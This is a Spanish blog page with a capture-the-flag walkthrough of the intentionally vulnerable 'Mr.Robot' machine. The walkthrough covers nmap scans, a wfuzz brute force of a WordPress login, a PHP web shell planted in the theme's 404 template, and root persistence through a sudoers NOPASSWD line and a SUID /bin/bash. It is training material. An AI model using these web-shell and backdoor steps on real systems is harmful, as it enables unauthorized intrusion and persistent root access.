<!DOCTYPE html> <html> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"> <title>Mr.Robot CTF &#8211; Al3xt0r</title> <meta name="description" content="Comentario:Esta fue de las primeras maquinas que hice, inspirada en la serie “Mr.Robot”. Tiene una forma muy entretenida de resolver, comenzamos:"> <meta name="keywords" content="CTF, VulnHub"> <!-- Twitter Cards --> <meta name="twitter:card" content="summary"> <meta name="twitter:image" content="prof.jpeg"> <meta name="twitter:title" content="Mr.Robot CTF"> <meta name="twitter:description" content="Comentario:Esta fue de las primeras maquinas que hice, inspirada en la serie “Mr.Robot”. Tiene una forma muy entretenida de resolver, comenzamos:"> <!-- Open Graph --> <meta property="og:locale" content="en_US"> <meta property="og:type" content="article"> <meta property="og:title" content="Mr.Robot CTF"> <meta property="og:description" content="Comentario:Esta fue de las primeras maquinas que hice, inspirada en la serie “Mr.Robot”. Tiene una forma muy entretenida de resolver, comenzamos:"> <meta property="og:url" content="http://localhost:4000/CTF-Mr.Robot/"> <meta property="og:site_name" content="Al3xt0r"> <meta property="og:image" content="http://localhost:4000/images/prof.jpeg"> <link rel="canonical" href="http://localhost:4000/CTF-Mr.Robot/"> <!-- Handheld --> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Feed --> <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="" /> <!-- Favicons --> <link rel="shortcut icon" type="image/png" href="http://localhost:4000/favicon.png" /> <link rel="shortcut icon" href="http://localhost:4000/favicon.ico" /> <!-- CSS --> <link rel="stylesheet" type="text/css" href="http://localhost:4000/assets/css/main.css"> <!-- Left Block Image for Posts --> <style type="text/css"> #posts.inner-post-page .block-left {background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url(http://localhost:4000/images/bk3.jpg) no-repeat;background-size: cover;} </style> <!-- Left Block Images for Home and Pages --> <style type="text/css"> #posts .block-left {background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url(http://localhost:4000/images/kg-ali.jpg) no-repeat;background-size: cover, cover;} .block-left {background: linear-gradient(rgba(44,45,51,0.9), rgba(44,45,51,0.9)), url(http://localhost:4000/images/bk2.jpeg) no-repeat;background-size: cover;} </style> </head> <body id="posts" class="inner-post-page"> <div class="block-left"> <div class="content"> <a href="http://localhost:4000" class="logo"><img src="http://localhost:4000/images/prof.jpeg"></a> <div class="post-title-section"> <div class="section-line">Posts <em>/</em></div> <h1 class="section-title">Mr.Robot CTF </h1> <ul class="tags"> <li><a href="http://localhost:4000/tags#CTF">CTF</a></li> <li><a href="http://localhost:4000/tags#VulnHub">VulnHub</a></li> </ul> <div class="section-line reverse"><a href="http://localhost:4000/posts">Back to posts</a> <em>/</em></div> </div> </div> </div> <div class="block-right"> <div class="share-buttons"> </div> <a href="../posts.html" title="posts" class="posts-menu-icon"></a> <a title="projects" class="projects-menu-icon"> <span></span> </a> <div class="inner-post content"> <div class="date-highlight">15 Jun 2023</div> <h2 class="lead" id="comentario">Comentario:</h2> <p>Esta fue de las primeras maquinas que hice, inspirada en la serie <strong>“Mr.Robot”</strong>. Tiene una forma muy entretenida de resolver, comenzamos:</p> <p><img src="/assets/img/Mr.Robot/Mr.Robot1.png" alt="" /></p> <p><strong>Lista de lo que se vera en esta machine:</strong></p> <ul> <li>Reconocimiento de puertos</li> <li>Explotacion</li> <li>Escalada de privilegios usando SUDOERS</li> </ul> <h2 id="reconocimiento">Reconocimiento</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> 65535 <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> &lt;IP-De la maquina&gt;
</code></pre></div></div> <p>O si quieres ir a lo loco:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-T5</span> &lt;IP- De la Maquina&gt;
</code></pre></div></div> <p>El caso, veremos puertos interesantes:</p> <p><img src="/assets/img/Mr.Robot/Mr1.png" alt="" /></p> <ul> <li>22 - SSH</li> <li>80 - Http</li> <li>443 - Https</li> </ul> <p>Ahora lo que haremos sera ver los servicios y las versiones usadas tras los puertos, usando el comando:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80,443 &lt;IP&gt;
</code></pre></div></div> <p><img src="/assets/img/Mr.Robot/Mr2.png" alt="" /></p> <p>Como podemos ver, tanto el puerto <strong>80,443</strong> nos llevan a una pagina web:</p> <p><img src="/assets/img/Mr.Robot/Mr3.png" alt="" /></p> <p>Para optimizar el proceso de enumeracion de directorios, tiraremos de un <strong>Script</strong>, propio de la herramienta nmap.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--script</span><span class="o">=</span>http-enum <span class="nt">-p80</span> &lt;IP De la Maquina&gt;
</code></pre></div></div> <p><img src="/assets/img/Mr.Robot/Mr4.png" alt="" /></p> <p>Podemos ver directorios interesantes, como:</p> <ul> <li><strong>/robots.txt</strong></li> <li><strong>/wp-login.php</strong></li> </ul> <p>Si vamos a la ruta robots veremos cosas interesantes:</p> <p><img src="/assets/img/Mr.Robot/Mr6.png" alt="" /> <img src="/assets/img/Mr.Robot/Mr5.png" alt="" /></p> <p>Nos descargamos lo que parece ser un diccionario, el archivo <strong>fsocity.dic</strong>.</p> <p>Y si lo analizamos, podremos ver que es un diccionario “extenso”:</p> <p><img src="/assets/img/Mr.Robot/Mr7.png" alt="" /> <img src="/assets/img/Mr.Robot/Mr8.png" alt="" /></p> <p>Pero si filtramos por el comando “sort”, para ordenar si es que existen cadenas de texto iguales, podremos ver passwords repetidas, asi que eliminaremos eso y nos quedaremos solo con las <strong>unicas</strong> y lo almacenaremos en un nuevo diccionario.</p> <p><img src="/assets/img/Mr.Robot/Mr9.png" alt="" /></p> <h2 id="intrusion">Intrusion</h2> <p>Ahora nos quedaria tirar de un ataque de fuerza bruta contra el directorio de login que descrubrimos anteriormente, “<strong>/wp-login.php</strong>”</p> <p>Si tratamos de testear al usuario, veremos que “<strong>admin</strong>”” no es un usuario existente:</p> <p><img src="/assets/img/Mr.Robot/Mr10.png" alt="" /></p> <p>Pero si hemos visto la serie, uno de los personajes principales tiene de nombre <strong>“Elliot Alderson”</strong>, asi que veamos si existe el usuario “<strong>elliot</strong>”</p> <p><img src="/assets/img/Mr.Robot/Mr11.png" alt="" /></p> <p>Como podemos ver, el usuario es existente, por lo que trataremos de aplicarle <strong>fuerza bruta</strong> al campo de la password. Usando la herramienta <strong>burpsuite</strong>, interceptaremos la peticion para obtener informacion importante:</p> <p><img src="/assets/img/Mr.Robot/Mr12.png" alt="" /></p> <p>Podemos ver cositas:</p> <ul> <li>La cabecera lleva una “Cookie”</li> <li>El campo que queremos bruteforcear se fija en <strong>log=elliot&amp;pwd=Password</strong></li> </ul> <p>Yo use la herramienta <strong>wfuzz</strong> para aplicar el ataque, pero puedes usar tranquilamente burpsuite pasandole el diccionario.</p> <p><img src="/assets/img/Mr.Robot/Mr13.png" alt="" /></p> <p>El comando utilizado fue:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-u</span> &lt;URL De la Maquina&gt;/wp-login.php <span class="nt">-H</span> <span class="s2">"Cookie: &lt;Cabecera que sacamos del burpsuite&gt;"</span> <span class="nt">-d</span> <span class="s2">"log=elliot&amp;pwd=FUZZ"</span> <span class="nt">-w</span> &lt;Ruta del diccionario que creamos&gt;
</code></pre></div></div> <p>Podemos ver que todas nos devuelven un estado 200, y una cantidad de respuesta igual a 3727, menos una password, <strong>“ER28-0652”</strong>, esta nos devuelve un codigo <strong>302 - FOUND</strong>. Por lo que esa es nuestra password.</p> <p><img src="/assets/img/Mr.Robot/Mr14.png" alt="" /></p> <p>Como podemos ver, entramos como el usuario Elliot, ahora nos toca buscar dentro de la interfaz algo que nos permita meternos de lleno dentro del servidor.</p> <p>Si nos dirigimos a “Appeareance”, podemos ver el codigo que se emplea para cuando se da un <strong>“404 Not Found”</strong></p> <p><img src="/assets/img/Mr.Robot/Mr15.png" alt="" /> <img src="/assets/img/Mr.Robot/Mr16.png" alt="" /></p> <p>Asi que como tenemos opcion de modificar la funcion, le introducimos un codigo php malicioso:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
  <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
<span class="o">&gt;</span>
</code></pre></div></div> <p><img src="/assets/img/Mr.Robot/Mr17.png" alt="" /></p> <p>Esto nos permite ejecutar codigo directamente en el sistema, usando php como interprete.</p> <p><img src="/assets/img/Mr.Robot/Mr18.png" alt="" /></p> <p>Por lo que nos queda introducir nuestra reverse shell y ganar acceso a la maquina:</p> <p><img src="/assets/img/Mr.Robot/Mr19.png" alt="" /></p> <p>Entonces, nos queda buscar si existen binarios con permisos <strong>SUID</strong> o similares:</p> <h2 id="escalada-de-privilegios-privesc">Escalada de Privilegios (PRIVESC)</h2> <p><img src="/assets/img/Mr.Robot/Mr20.png" alt="" /></p> <p>Podemos ver que tenemos un binario de <strong>nmap</strong>, pero si vemos la version, vamos a toparnos con que es muy desactualizada, asi que vamos a nuestra pagina de confianza <a href="https://gtfobins.github.io">GTFOBINS</a></p> <p><img src="/assets/img/Mr.Robot/Mr21.png" alt="" /></p> <p>Ejecutamos el comando binario como nos lo indica, y podemos ejecutar comandos como root:</p> <p><img src="/assets/img/Mr.Robot/MrRobot21.png" alt="" /></p> <p>En este caso, podemos explotar el fichero de <strong>/etc/sudoers</strong>, para no introducir password, o podemos darle permisos de super usuario al binario de <strong>/bin/bash</strong>:</p> <p>Para el sudoers:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"ALL ALL=(ALL) NOPASSWD: ALL"</span> | tee <span class="nt">-a</span> /etc/sudoers
</code></pre></div></div> <p>Para el binario de <strong>bash</strong></p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod u+s /bin/bash
</code></pre></div></div> <p>Para finalizar, si estas en <strong>TryHackMe</strong>, aqui te doy la forma rapida de tener las llaves:</p> <p><img src="/assets/img/Mr.Robot/Mr22.png" alt="" /></p> <h2 id="fin">FIN</h2> <br> <nav class="pagination"> <a href="#" class="pagination_pager disabled">previous</a> <a href="http://localhost:4000/HTB-Inject/" class="pagination_pager" title="Htb Inject ">next</a> </nav> </div> </div> <!-- JS --> <script src="http://localhost:4000/assets/js/main.min.js"></script> <div class="overlay"> <ul class="projects-menu"> <li style="background:url(https://user-images.githubusercontent.com/86735230/184715052-062e79fd-d01b-4148-b5d2-7e64878d1f50.png) center center no-repeat;"> <a href="http://github.com/SirDext3r/JavascriptRandomizeArt" target="_blank" rel="nofollow external"> <span> Geometry Art </span> </a> </li> </ul> </div> </body> </html>
